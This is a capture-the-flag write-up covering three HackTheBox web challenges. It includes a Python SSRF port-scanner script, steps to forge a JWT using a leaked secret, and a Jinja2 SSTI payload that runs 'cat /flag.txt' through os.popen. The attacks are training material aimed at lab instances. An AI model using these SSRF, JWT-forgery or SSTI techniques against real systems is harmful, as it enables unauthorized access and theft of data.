---
title: "Hack The System - Bug Bounty CTF Writeups (Part 1)"
date: 2025-10-3
excerpt: "This event organized by HackTheBox"
tags:
  - HackTheSystem
  - SSRF
  - CouchDB
  - JWT
  - Blackbox
  - SSTI
---

# CitiSmart - HackTheSystem 2025

## Challenge Description

Citismart is an innovative Smart City monitoring platform aimed at detecting anomalies in public sector operations. We invite you to explore the application for any potential vulnerabilities and uncover the hidden flag within its depths.

## Exploitation

### 1. Recon

This is a blackbox challenge.

The website has an initial interface as shown:

![alt text](/images/posts/hack-the-system/CitiSmart/image-2.png)

The `Get Started` or `Login` button both lead to the login page:

![alt text](/images/posts/hack-the-system/CitiSmart/image-3.png)

The website only has login functionality, no registration feature. When logging in with any account (the website requires passwords of 6 characters or more), login fails (returns **User not found**):

![alt text](/images/posts/hack-the-system/CitiSmart/image-4.png)

The login request includes a cookie token, meaning that even if login is unsuccessful, the user is still granted this cookie token.

This is a **JWT token**. Decoding it with CyberChef shows the role `"admin": false`. Could the attack vector be privilege escalation to admin?

![alt text](/images/posts/hack-the-system/CitiSmart/image-5.png)

Check DevTools, in the Debugger section, I found information related to the hidden endpoints of the website:

![alt text](/images/posts/hack-the-system/CitiSmart/image-6.png)

### 2. Analysis

#### 2.1. Endpoint `/api/auth/me`

Access this endpoint and the website returns `"cookie token is not found"`:

![alt text](/images/posts/hack-the-system/CitiSmart/image-11.png)

This means to access this endpoint, you need a JWT token.

Go back to the login interface -> login with any account -> get JWT -> successfully access the endpoint:

![alt text](/images/posts/hack-the-system/CitiSmart/image-12.png)

Login fails, access endpoint through URL.

With the token obtained when login fails, the `/api/auth/me` endpoint returns `Unauthorized`. We can see this endpoint requires the role `"admin:true"`:

![alt text](/images/posts/hack-the-system/CitiSmart/image-13.png)

#### 2.2. Endpoint `/api/auth/login`

The `/api/auth/login` endpoint returns `Cannot GET /api/auth/login`, temporarily skip this endpoint:

![alt text](/images/posts/hack-the-system/CitiSmart/image-14.png)

#### 2.3. Endpoint `/api/dashboard/endpoints`; `/api/dashboard/endpoints/`

This API endpoint lists the monitored endpoints and their information:

![alt text](/images/posts/hack-the-system/CitiSmart/image-15.png)

Try accessing the `/dashboard` web service directly, this service has an interface as shown:

![alt text](/images/posts/hack-the-system/CitiSmart/image-16.png)

Go to the `Manage` function, this service allows viewing existing endpoints and adding new endpoints:

![alt text](/images/posts/hack-the-system/CitiSmart/image-17.png)

#### 2.4. Endpoint `/api/dashboard/metrics`

This endpoint allows viewing more detailed data about the endpoints in the monitored endpoint list.

### 3. Attack vector - SSRF

Try adding a new monitoring endpoint pointing to an internal service, such as `http://127.0.0.1:80/dashboard`:

![alt text](/images/posts/hack-the-system/CitiSmart/image-20.png)

![alt text](/images/posts/hack-the-system/CitiSmart/image-18.png)

Successfully added, access the `/metrics` endpoint to check the endpoint data more carefully -> no notable points:

![alt text](/images/posts/hack-the-system/CitiSmart/image-19.png)

Continue exploiting this add endpoint function. For better efficiency, we need to know which internal ports are active to provide services for the site. Run the following script to find open ports (note: change the JWT token in the code to an active token, similar with the instance):

```python
import requests
import json
import threading
from queue import Queue
from tqdm import tqdm
import sys

API_URL = 'http://94.237.60.55:40770/api/dashboard/endpoints/'

JWT_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6ZmFsc2UsImFkbWluIjpmYWxzZSwiaWF0IjoxNzU2NjU5Mjc3LCJleHAiOjE3NTY2NjI4Nzd9.mq5-ceuCqP3pdLyae9cKx9n8_WtnaPzXV_J_RJCpl4U'

HEADERS = {
    'Cookie': f'token={JWT_TOKEN}',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
}

TARGET_IP = "127.0.0.1"
PORTS_TO_SCAN = range(1, 65536)
THREAD_COUNT = 200 

port_queue = Queue()
for port in PORTS_TO_SCAN:
    port_queue.put(port)

open_ports = []
list_lock = threading.Lock()

def perform_scan(pbar):
    while not port_queue.empty():
        try:
            port = port_queue.get_nowait()
        except Queue.Empty:
            break

        payload = {
            "url": f"http://{TARGET_IP}:{port}/",
            "sector": f"internal_scan_{port}"
        }

        try:
            response = requests.post(API_URL, headers=HEADERS, 
                                   data=json.dumps(payload), timeout=5)

            if "ECONNREFUSED" not in response.text:
                with list_lock:
                    open_ports.append(port)

        except requests.exceptions.Timeout:
            with list_lock:
                open_ports.append(port)
        except requests.exceptions.RequestException:
            pass
        finally:
            pbar.update(1)
            port_queue.task_done()

def main():
    if not JWT_TOKEN or JWT_TOKEN == 'your_token_here':
        print("Invalid JWT token")
        sys.exit(1)

    pbar = tqdm(total=port_queue.qsize(), desc="Scanning port", unit="port")

    threads = []
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=perform_scan, args=(pbar,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    port_queue.join()

    for thread in threads:
        thread.join()
        
    pbar.close()

    if open_ports:
        final_ports = sorted(list(set(open_ports)))
        print("\nOpen ports found:")
        print(final_ports)
    else:
        print("\nNo open ports found.")

if __name__ == '__main__':
    main()
```

![alt text](/images/posts/hack-the-system/CitiSmart/image-21.png)

![alt text](/images/posts/hack-the-system/CitiSmart/image-22.png)

Check the obtained service ports, I discovered that port 5984 is for **CouchDB**. Search for `CouchDB cheatsheet` to learn more about this web service, [reference](https://dev.to/yenyih/apache-couchdb-cheatsheet-2ggk)

GET the following endpoint to see existing databases:

![alt text](/images/posts/hack-the-system/CitiSmart/image-23.png)

Add this endpoint to the list of monitored endpoints, then go to the `/metrics` API endpoint to view more information about this endpoint:

![alt text](/images/posts/hack-the-system/CitiSmart/image-24.png)

![alt text](/images/posts/hack-the-system/CitiSmart/image-25.png)

A database named **citismart** appears.

Next, use the following endpoint to list the data in the database:

![alt text](/images/posts/hack-the-system/CitiSmart/image-26.png)

Add to the list of monitored endpoints and check information at `/metrics`:

![alt text](/images/posts/hack-the-system/CitiSmart/image-27.png)

![alt text](/images/posts/hack-the-system/CitiSmart/image-28.png)

`id = FLAG` appears. In CouchDB, to access a document, the URL has the form `http://host:5984/database/document_id` -> add endpoint `http://127.0.0.1:5984/citismart/FLAG?` to retrieve the flag content:

![alt text](/images/posts/hack-the-system/CitiSmart/image-29.png)

![alt text](/images/posts/hack-the-system/CitiSmart/image-30.png)

Flag: HTB{sm4rt_cit1_but_n0t_s3cur3}

---

# Criticalops - HackTheSystem 2025

## Challenge Description

Criticalops is a web app used to monitor critical infrastructure in the XYZ region. Users submit tickets to report unusual behavior. Please uncover potential vulnerabilities, and retrieve the hidden flag within the system.

## Exploitation

### 1. Recon

This is a blackbox challenge (note: use https to access the instance of this challenge).

The initial interface of the website is shown:

![alt text](/images/posts/hack-the-system/Criticalops/image.png)

When selecting `Get Started`, it will redirect to the `Register` page:

![alt text](/images/posts/hack-the-system/Criticalops/image-1.png)

The `/login` page:

![alt text](/images/posts/hack-the-system/Criticalops/image-2.png)

Login successful, the web has 2 pages: Dashboard and Tickets.

`Dashboard`:

![alt text](/images/posts/hack-the-system/Criticalops/image-3.png)

`Tickets`:

![alt text](/images/posts/hack-the-system/Criticalops/image-4.png)

This service has the function to report incidents:

![alt text](/images/posts/hack-the-system/Criticalops/image-5.png)

Check Network in DevTools at `/dashboard`, see the `authToken` of the current user:

![alt text](/images/posts/hack-the-system/Criticalops/image-6.png)

Decode with CyberChef, in this JWT token there is information about the role. For the current user, `role:"user"`, so it's possible that we need to escalate privileges to admin role to exploit?

![alt text](/images/posts/hack-the-system/Criticalops/image-7.png)

Continue checking DevTools at `/login`, found that JWT_SECRET is exposed:

![alt text](/images/posts/hack-the-system/Criticalops/image-9.png)

### 2. Plugin JWT Editor - Burp Suite

Use the JWT Editor plugin - Burp Suite to modify the role from user -> admin in JWT -> escalate privileges -> view hidden information.

Add Symmetric Key as the JWT_SECRET obtained:

![alt text](/images/posts/hack-the-system/Criticalops/image-11.png)

![alt text](/images/posts/hack-the-system/Criticalops/image-10.png)

Forward the request with JWT to Repeater (fetch request to `/api/tickets`):

![alt text](/images/posts/hack-the-system/Criticalops/image-12.png)

1: Go to the JSON Web Token tab

2: Change role to `admin`
    
3: Click `Sign`

![alt text](/images/posts/hack-the-system/Criticalops/image-14.png)

4: Send the request again with the new JWT

![alt text](/images/posts/hack-the-system/Criticalops/image-15.png)

Flag: HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_lm4o}

---

# JinjaCare - HackTheSystem 2025

## Challenge Description

Jinjacare is a web app for managing COVID-19 vaccination records, allowing users to view history and generate digital certificates. You're invited to identify security vulnerabilities in the system and retrieve the hidden flag from the application.

## Exploitation

### 1. Recon

This is a blackbox challenge.

The initial interface of the website is shown:

![alt text](/images/posts/hack-the-system/JinjaCare/image.png)

The challenge name is JinjaCare, SSTI is the first vulnerability that comes to mind when talking about Jinja, so let's try exploiting with SSTI first.

### 2. SSTI

Sign in with content `{{7*7}}` -> Cannot because the content field in Register does not accept special characters.

Register and login with a valid account. The website has the following functions:

`Verify Certificate` function with cert ID provided by user:

![alt text](/images/posts/hack-the-system/JinjaCare/image-1.png)

Update information function at `Personal Info`:

![alt text](/images/posts/hack-the-system/JinjaCare/image-2.png)

Add Record function at `Medical History`:

![alt text](/images/posts/hack-the-system/JinjaCare/image-3.png)

Add Vaccination function at `Vaccination Records`:

![alt text](/images/posts/hack-the-system/JinjaCare/image-4.png)

In the challenge description, it mentions 2 functions: **view history** and **generate digital certificates**, even though the web has many functions. Could these 2 functions have notable points?

The generate digital certificates function (Download Certificate) will create a certificate with **Name** taken from the information in the `Personal Info` section and also has the cert ID to verify if it's valid:

![alt text](/images/posts/hack-the-system/JinjaCare/image-12.png)

Verify Certificate function:

Try payload `{{7*7}}` but no signs of SSTI appear:

![alt text](/images/posts/hack-the-system/JinjaCare/image-5.png)

Change information function at Personal Info:

Try payload `{{7*7}}`:

![alt text](/images/posts/hack-the-system/JinjaCare/image-8.png)

Save and check if the information printed on the cert has changed -> SSTI appears in the **Name** field. This is the attack surface.

![alt text](/images/posts/hack-the-system/JinjaCare/image-9.png)

Try payload `{{ ''.__class__.__mro__[1].__subclasses__() }}` -> View all classes defined in the program → can find important classes like `subprocess.Popen` to run system commands.

Since we cannot import os directly in the Jinja2 sandbox, we must find a way to indirectly access os through classes that already exist in the program. Each class may or may not have `<.init__.__globals__['os']>`. The goal is to find a class (usually `warnings.catch_warnings` or `subprocess.Popen`) where the `__init__()` function has imported os ⇒ can utilize os:

![alt text](/images/posts/hack-the-system/JinjaCare/image-10.png)

Found class `subprocess.Popen`.

Now need to find the index of a class that has os imported in its `__init__` function. Use the following payload in the **Name** field of the `Personal Info` function, then check again at the cert -> The first number in the response is the index we need:

![alt text](/images/posts/hack-the-system/JinjaCare/image-11.png)

With the index obtained, continue using the payload in the **Name** field of the `Personal Info` function, then check again at the cert:
    
```
{{ ''.__class__.__mro__[1].__subclasses__()[Replace index here].__init__.__globals__['os'].popen('cat /flag.txt').read() }}
```

Flag: HTB{v3ry_e4sy_sst1_r1ght?}